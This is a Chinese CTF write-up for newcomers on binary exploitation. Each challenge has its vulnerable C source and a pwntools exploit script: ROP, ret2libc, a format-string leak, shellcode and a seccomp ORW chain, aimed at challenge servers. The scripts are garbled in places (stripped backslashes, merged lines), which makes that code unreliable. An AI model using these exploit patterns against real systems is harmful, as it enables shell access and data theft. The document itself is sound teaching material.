# 从某新生赛入门PWN

> 原文: https://www.ctfiot.com/80255.html
> ID: 80255

在某平台上看到了质量不错的新生赛，难度也比较适宜，因此尝试通过该比赛进行入门，也将自己所学分享给大家。

该程序的C代码如下，因此我们只要使buff和test的前三十个字节相同即可。因此可以直接在比较处下断点查看buff数组的值即可。

#include<stdio.h>char buff[100];
int v0;
char buffff[]="ABCDEFGHIJKLMNOPQRSTUVWXYZ1234";
char bua[]="abcdefghijklmnopqrstuvwxyz4321";char* enccrypt(char *buf){ int a; for(int i=0;i<29;i++){ a=rand(); buf[i]^=buffff[i]; buff[i]^=bua[i]; for(int j=29;j>=0;j--){ buf[j]=buff[i]; buf[i]+='2'; } buf[i]-=((bua[i]^0x30)*(buffff[i]>>2)&1)&0xff; buf[i]+=(a%buff[i])&0xff; }}int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); puts("GDB-pwndbg maybe useful"); char buf[]="Ayaka_nbbbbbbbbbbbbbbbbb_pluss"; strcpy(buff,buf); char test[30]; int v0=1; srand(v0); enccrypt(buff); read(0,test,30); if(!strncmp(buff,test,30)){ system("/bin/sh"); } else { puts("Oh No!You lose!!!"); exit(0); } return; }

因此在0x4014b4处下断点，查看buff的值即可，将buff的值发送即可。（注意小端模式）

from pwn import *context.log_level='debug'#io=process('./ezcmp')io=remote('43.143.7.97',28931)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()sl(b'x72x40x0exdcxaax78x46x14xe2xb0x7ex4cx1axe8xb6x84x52x20xeexbcx8ax58x26xf4xc2x90x5ex2cxcbxc8')shell()

查看该程序保护：

开了NX，NX即No-execute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就有了各种绕过办法，rop就是一种，根据题目名称可以知道该题目即需要通过rop绕过。

ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。使指令被执行时都处于可执行区域，通过多个指令拼接起到shellcode的作用。

IDA打开该程序进行分析，可以发现该程序的漏洞点位于dofunc处:

在第二个read处存在着栈溢出，溢出长度为0x30-0x1c=0x14，因此在覆盖了ebp之后还存在0x10的溢出长度。

因此可以通过system(‘/bin/shx00’)来getshell。在32位程序中函数的参数保存在栈中，因此直接在ret处覆盖为call system函数的地址即可，而在其后存放/bin/sh的地址即可。

我们可以发现在该程序找到call system，但是找不到/bin/sh。此时发现在溢出前面还存在一个read，并且读入的地址是bss段，因此我们可以通过第一个read将/bin/sh读入bss。（如果是将ret地址覆盖为system函数地址的话，需要在system后面随意加一个4字节数作为system函数的返回地址后再加/bin/sh;而在call system时它会进行push eip+4的操作将返回地址压入栈中)

from pwn import *context.log_level='debug'#io=process('./ezr0p')io=remote('1.14.71.254',28637)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()sl(b'/bin/sh')rl()payload=b'a'*0x20+p32(0x08048562)+p32(0x0804A080)sl(payload)shell()

查看保护

同理可以通过rop进行绕过。IDA打开程序进行分析：

发现程序中既没有system，也没有/bin/sh，但是我们发现程序在vuln函数中给出了我们puts函数的地址。因此我们可以通过获取puts函数的地址来取得libc的基址。这是因为所有函数地址都在libc中，其中libc中也包括着/bin/sh，而各个函数或者字符的相对偏移是不变的。因此获取到libc的基址后我们根据相对偏移就可以获取到system函数的地址和/bin/sh的地址。

但是在64位程序中还需要注意函数的参数是通过rdi，rsi，rdx，rcx，r8，r9这6个寄存器进行存储。而system函数的参数只要一个，即通过rdi进行存储，因此我们可以通过pop rdi，ret来构造system的参数。

from pwn import *from LibcSearcher import *context.log_level='debug'#io=process('./ezrop64')elf=ELF('./ezrop64')libc=ELF('./libc.so.6')puts_got=elf.got['puts']puts_plt=elf.plt['puts']printf_got=elf.got['printf']io=remote('1.14.71.254',28658)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()ru(b'Gift :')puts_addr=int(r(14)[:],16)baseadd=puts_addr-libc.symbols['puts']print(hex(baseadd))system=baseadd+libc.symbols['system']print(hex(system))binsh=baseadd+libc.search(b'/bin/sh').__next__()print(hex(binsh))payload=b'a'*0x108+p64(0x4012a3)+p64(binsh)+p64(0x40101a)+p64(system)ru('Start your rop.n')sl(payload)shell()

该程序的c代码如下，它先读取入了flag文件，然后将该值赋给了pointer。而在最后的printf函数中存在着格式化字符串漏洞。

#include<stdio.h>char name[0x30];
int key;
int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); puts("Welcome to the world of fmtstr"); puts("> "); int fd=open("flag",0); if(fd==-1){ perror("Open failed."); } read(fd,name,0x30); size_t *pointer=&name; char buf[0x100]; puts("Input your format string."); read(0,buf,0x100); puts("Ok."); printf(buf);}

格式化字符串漏洞主要是因为printf不会检查格式化字符串中的占位符是否与所给的参数数目相等。而在printf输出的过程中，每遇到一个占位符，就会到“约定好”的位置获取数据并根据该占位符的类型解码并输出。因此我们可以通过输入恶意构造的格式化字符串来实现任意地址写，任意地址读。

但是首先我们需要知道我们现在的格式化字符串的位置，这可以通过多个%p来获取。

在该程序中，我们可以发现第六个%p处输出了我们最先输入的aaaaaaaa。因此我们输入的格式化字符串处于第六个位置。而在任意地址读写时需要注意的是printf函数遇到x00时会被截断，因此地址这些参数都需要放在最后面。除此之外，我们还需要保证格式化字符串与栈对齐，否则相应对应的地址无法正确解析。

from pwn import *context.log_level='debug'#io=process('./ezfmt')io=remote('43.143.7.97',28705)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()rl()rl()payload=b'%7$s....'+p64(0x4040a0)s(payload)rl()

该程序的c代码如下，可以发现我们需要输入的指令的每个字符都处于‘0’~‘z’中，这样才会执行我们输入的指令。

#include<stdio.h>char buff[0x200];
int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); mprotect((long long)(&stdout)&0xfffffffffffff000,0x1000,7); char buf[0x200]; memset(buf,0,0x200); read(0,buf,0x300); for(int i=0;i<strlen(buf);i++){ if(buf[i]<'0'||buf[i]>'z'){ puts("Hacker!!!"); exit(0); } } strcpy(buff,buf); ((void (*)(void))buff)(); return 0;}

通过构造syscall执行read读入无限制shellcode。

from pwn import * context(log_level='debug',arch='amd64',os='linux') io=process('./shellcoder')attach(io)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()pause()shellcode=''' push rax pop rsi push 0x40404040 pop rax xor rax,0x40404040 push rax pop rdi push 0x40404040 pop rax xor rax,0x40404141 push rax pop rdx push 0x40404040 pop rax xor rax,0x40404040 push 0x60604040 pop rcx xor dword ptr[rsi+0x33],ecx '''s(asm(shellcode)+b'x4fx45x30x30')payload=b'a'*0x35+asm(shellcraft.sh())sl(payload)shell()

该程序c代码如下：

#include<stdio.h>char buff[256];
int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); mprotect((long long)(&stdout)&0xfffffffffffff000,0x1000,7); char buf[256]; memset(buf,0,0x100); read(0,buf,0x110); strcpy(buff,buf); return 0;}

可以知道该程序开辟了一段长度为0x1000的可读可写可执行的区域。

并且在read 函数处存在栈溢出，并且会把我们的输入复制给可执行的区域，因此我们在读取最开始处写入shellcode；然后再覆盖返回地址为buff的地址处即可。

from pwn import *context.log_level='debug'context(os='linux', arch='amd64', log_level='debug')#io=process('./shellcode')io=remote('43.143.7.97',28497)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()payload=asm(shellcraft.sh())sl(payload.ljust(0x108,b'x00')+p64(0x4040a0))shell()

该程序代码如下，可以发现为最简单的栈溢出，只要覆盖number的值使其不为0即可。

#include<stdio.h>int main(){ setbuf(stdin,0); setbuf(stdout,0); setbuf(stderr,0); puts("Input something"); char name[30]; int number=0; gets(name); if(number!=0){ puts("You win."); system("cat flag"); } return 0;

直接输入一大串字符即可。

IDA打开分析，发现是简单的逆向分析，需要确保输入的24数字经过运算之后与s2一致。因为计算比较简单，而且必须都是数字，因此我们可以直接在0-9中进行爆破即可，满足条件的即是正确的值。

#!/usr/bin/env python
# -*- encoding: utf-8 -*-from pwn import *from LibcSearcher import *context(log_level='debug',arch='amd64',os='linux')io=process('./arrayRE')#io=remote('43.143.7.97',28126)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()a='831654239123423452610584'flag='8'def decode(a1,a2): return (35*(a1-48)+18*(a2-48)+2)%10for i in range(len(a)-1): for j in range(10): if (decode(ord(a[i]),i+ord(a[i]))+int(j)+3)%10+48==ord(a[i+1]): flag+=str(j) breakprint(flag)rl()rl()sl(b'aaa')ru(b'password:')sl(flag)shell()

先看程序保护：

ida打开分析，可以发现该程序存在seccomp沙箱，即限制了可用的系统调用。

通过seccomp-tools进行分析，可以发现该程序只允许通过系统调用open，read，write三个函数。因此我们无法getshell，但是可以通过open(‘flag’,0),read(fd,bss,length),write(1,bss,length)或者puts(bss)来进行泄露函数。

继续分析程序，可以发现在vuln函数中存在整数溢出，在进行比较时v2为int类型，但是经过bitchange转换后会变成无符号整数，因此输入一个负数会转变成一个极大的正数造成溢出。

而且flag字符可以在程序中找到。

造成溢出后我们就可以通过构造rop链来实现orw。但是我们发现在该处并没有给rdx赋值的gadget，此时有两个思路，一个是利用ret2csu，一个是利用libc中间的gadget。ret2csu会在下一题讲到，因此在这里用的是libc中的gadget。

由于程序开启了full relro，因此要利用orw的话要先泄露libc基址以便于利用open函数与libc中的gadget。

所以此题流程为先利用puts函数泄露puts函数地址，然后再劫持控制流返回到main函数再次造成溢出，在此构造rop链来达成orw。

#!/usr/bin/env python
# -*- encoding: utf-8 -*-from pwn import *from LibcSearcher import *context(log_level='debug',arch='amd64',os='linux')elf=ELF('./intorw')libc=ELF('./libc.so.6')io=process('./intorw')io=remote('43.143.7.97',28254)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()sl(b'-1000')read_plt=elf.plt['read']pop_addr=0x0400ACAmov_addr=0x00400AB0puts_plt=elf.plt['puts']puts_got=elf.got['puts']bss=0x6010E0pop_rdi=0x400ad3payload=b'a'*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x4009C4)rl()sl(payload)puts_addr=u64(ru(b'x7f').ljust(8,b'x00'))libc_base=puts_addr-libc.sym['puts']pop_rsi=0x2be51+libc_basepop_rdx_r12=0x11f497+libc_baseprint(hex(libc_base))opEn=libc_base+libc.sym['open']write=libc_base+libc.sym['write']rl()rl()sl(b'-100')rl()payload=b'a'*0x28+p64(pop_rdi)+p64(0x601046)+p64(pop_rsi)+p64(0)+p64(opEn)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x601000)+p64(pop_rdx_r12)+p64(0x100)+p64(0)+p64(read_plt)+p64(pop_rdi)+p64(0x601000)+p64(puts_plt)sl(payload)rl()

链接：https://pan.baidu.com/s/1wB9peKp2BL8h2tmjruPqlQ

提取码：f4tw

看雪ID：bad_c0de

https://bbs.pediy.com/user-home-967128.htm

*本文由看雪论坛 bad_c0de 原创，转载请注明来自看雪社区

# 往期推荐

1.CVE-2022-21882提权漏洞学习笔记

2.wibu证书 – 初探

3.win10 1909逆向之APIC中断和实验

4.EMET下EAF机制分析以及模拟实现

5.sql注入学习分享

6.V8 Array.prototype.concat函数出现过的issues和他们的POC们

球分享

球点赞

球在看

点击“阅读原文”，了解更多！


```
    #include<stdio.h>char buff[100];
int v0;
char buffff[]="ABCDEFGHIJKLMNOPQRSTUVWXYZ1234";
char bua[]="abcdefghijklmnopqrstuvwxyz4321";char* enccrypt(char *buf){ int a; for(int i=0;i<29;i++){ a=rand(); buf[i]^=buffff[i]; buff[i]^=bua[i]; for(int j=29;j>=0;j--){ buf[j]=buff[i]; buf[i]+='2'; } buf[i]-=((bua[i]^0x30)*(buffff[i]>>2)&1)&0xff; buf[i]+=(a%buff[i])&0xff; }}int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); puts("GDB-pwndbg maybe useful"); char buf[]="Ayaka_nbbbbbbbbbbbbbbbbb_pluss"; strcpy(buff,buf); char test[30]; int v0=1; srand(v0); enccrypt(buff); read(0,test,30); if(!strncmp(buff,test,30)){ system("/bin/sh"); } else { puts("Oh No!You lose!!!"); exit(0); } return; }
from pwn import *context.log_level='debug'#io=process('./ezcmp')io=remote('43.143.7.97',28931)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()sl(b'x72x40x0exdcxaax78x46x14xe2xb0x7ex4cx1axe8xb6x84x52x20xeexbcx8ax58x26xf4xc2x90x5ex2cxcbxc8')shell()
from pwn import *context.log_level='debug'#io=process('./ezr0p')io=remote('1.14.71.254',28637)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()sl(b'/bin/sh')rl()payload=b'a'*0x20+p32(0x08048562)+p32(0x0804A080)sl(payload)shell()
from pwn import *from LibcSearcher import *context.log_level='debug'#io=process('./ezrop64')elf=ELF('./ezrop64')libc=ELF('./libc.so.6')puts_got=elf.got['puts']puts_plt=elf.plt['puts']printf_got=elf.got['printf']io=remote('1.14.71.254',28658)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()ru(b'Gift :')puts_addr=int(r(14)[:],16)baseadd=puts_addr-libc.symbols['puts']print(hex(baseadd))system=baseadd+libc.symbols['system']print(hex(system))binsh=baseadd+libc.search(b'/bin/sh').__next__()print(hex(binsh))payload=b'a'*0x108+p64(0x4012a3)+p64(binsh)+p64(0x40101a)+p64(system)ru('Start your rop.n')sl(payload)shell()
    #include<stdio.h>char name[0x30];
int key;
int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); puts("Welcome to the world of fmtstr"); puts("> "); int fd=open("flag",0); if(fd==-1){ perror("Open failed."); } read(fd,name,0x30); size_t *pointer=&name; char buf[0x100]; puts("Input your format string."); read(0,buf,0x100); puts("Ok."); printf(buf);}
from pwn import *context.log_level='debug'#io=process('./ezfmt')io=remote('43.143.7.97',28705)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()rl()rl()payload=b'%7$s....'+p64(0x4040a0)s(payload)rl()
    #include<stdio.h>char buff[0x200];
int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); mprotect((long long)(&stdout)&0xfffffffffffff000,0x1000,7); char buf[0x200]; memset(buf,0,0x200); read(0,buf,0x300); for(int i=0;i<strlen(buf);i++){ if(buf[i]<'0'||buf[i]>'z'){ puts("Hacker!!!"); exit(0); } } strcpy(buff,buf); ((void (*)(void))buff)(); return 0;}
from pwn import * context(log_level='debug',arch='amd64',os='linux') io=process('./shellcoder')attach(io)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()pause()shellcode=''' push rax pop rsi push 0x40404040 pop rax xor rax,0x40404040 push rax pop rdi push 0x40404040 pop rax xor rax,0x40404141 push rax pop rdx push 0x40404040 pop rax xor rax,0x40404040 push 0x60604040 pop rcx xor dword ptr[rsi+0x33],ecx '''s(asm(shellcode)+b'x4fx45x30x30')payload=b'a'*0x35+asm(shellcraft.sh())sl(payload)shell()
    #include<stdio.h>char buff[256];
int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); mprotect((long long)(&stdout)&0xfffffffffffff000,0x1000,7); char buf[256]; memset(buf,0,0x100); read(0,buf,0x110); strcpy(buff,buf); return 0;}
from pwn import *context.log_level='debug'context(os='linux', arch='amd64', log_level='debug')#io=process('./shellcode')io=remote('43.143.7.97',28497)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()payload=asm(shellcraft.sh())sl(payload.ljust(0x108,b'x00')+p64(0x4040a0))shell()
    #include<stdio.h>int main(){ setbuf(stdin,0); setbuf(stdout,0); setbuf(stderr,0); puts("Input something"); char name[30]; int number=0; gets(name); if(number!=0){ puts("You win."); system("cat flag"); } return 0;
#!/usr/bin/env python
# -*- encoding: utf-8 -*-from pwn import *from LibcSearcher import *context(log_level='debug',arch='amd64',os='linux')io=process('./arrayRE')#io=remote('43.143.7.97',28126)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()a='831654239123423452610584'flag='8'def decode(a1,a2): return (35*(a1-48)+18*(a2-48)+2)%10for i in range(len(a)-1): for j in range(10): if (decode(ord(a[i]),i+ord(a[i]))+int(j)+3)%10+48==ord(a[i+1]): flag+=str(j) breakprint(flag)rl()rl()sl(b'aaa')ru(b'password:')sl(flag)shell()
#!/usr/bin/env python
# -*- encoding: utf-8 -*-from pwn import *from LibcSearcher import *context(log_level='debug',arch='amd64',os='linux')elf=ELF('./intorw')libc=ELF('./libc.so.6')io=process('./intorw')io=remote('43.143.7.97',28254)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()sl(b'-1000')read_plt=elf.plt['read']pop_addr=0x0400ACAmov_addr=0x00400AB0puts_plt=elf.plt['puts']puts_got=elf.got['puts']bss=0x6010E0pop_rdi=0x400ad3payload=b'a'*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x4009C4)rl()sl(payload)puts_addr=u64(ru(b'x7f').ljust(8,b'x00'))libc_base=puts_addr-libc.sym['puts']pop_rsi=0x2be51+libc_basepop_rdx_r12=0x11f497+libc_baseprint(hex(libc_base))opEn=libc_base+libc.sym['open']write=libc_base+libc.sym['write']rl()rl()sl(b'-100')rl()payload=b'a'*0x28+p64(pop_rdi)+p64(0x601046)+p64(pop_rsi)+p64(0)+p64(opEn)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x601000)+p64(pop_rdx_r12)+p64(0x100)+p64(0)+p64(read_plt)+p64(pop_rdi)+p64(0x601000)+p64(puts_plt)sl(payload)rl()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1669458720.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1669458721.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1669458721.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1669458721.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1669458722.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/9-1669458722.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1669458722.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/6-1669458723.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/6-1669458723.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/9-1669458723.png)